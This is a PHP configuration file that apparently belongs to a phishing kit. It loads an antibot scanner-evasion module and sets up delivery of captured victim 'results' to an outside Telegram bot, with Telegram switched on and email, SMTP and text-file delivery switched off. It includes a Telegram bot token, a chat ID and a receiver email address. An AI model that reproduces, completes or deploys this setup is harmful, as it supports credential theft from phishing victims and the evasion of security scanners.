<?php

    
    session_start();

    define("ANTIBOT_API", 'API_HERE'); // ANTIBOT.PW API
    require_once 'detect.php';
    require_once 'functions.php';

    define("PASSWORD", 'ATB');
    define("RECEIVER", 'jana-pmierdorf@outlook.com');
    define("TELEGRAM_TOKEN", '7705750831:AAH-QdRpOnPaoNb_dm50e1M3RCWjMK7i-oU');
    define("TELEGRAM_CHAT_ID", '-4971286639');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'Nawras0012.txt');
    define("OFFICIAL_WEBSITE", 'https://#');
    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>